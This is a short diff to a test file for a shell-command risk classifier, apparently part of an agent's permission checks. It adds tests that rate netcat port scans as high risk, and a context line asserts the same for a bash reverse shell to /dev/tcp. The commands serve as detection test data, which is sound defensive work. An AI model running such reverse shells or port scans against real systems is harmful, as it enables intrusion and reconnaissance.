@@ -31,6 +31,11 @@ test("classifyBash returns 'high' for reverse shells", () => {
   expect(classifyBash("bash -i >& /dev/tcp/x/4444 0>&1")).toBe("high");
 });
 
+test("classifyBash returns 'high' for nc port scans (-z)", () => {
+  expect(classifyBash("nc -w 1 -z host 22")).toBe("high");
+  expect(classifyBash("nc -zv host 1-1024")).toBe("high");
+});
+
 test("classify falls back to 'low' for unknown tool names", () => {
   expect(classify("hyprland", { action: "arrange" })).toBe("low");
   expect(classify("screen", { region: "full" })).toBe("low");
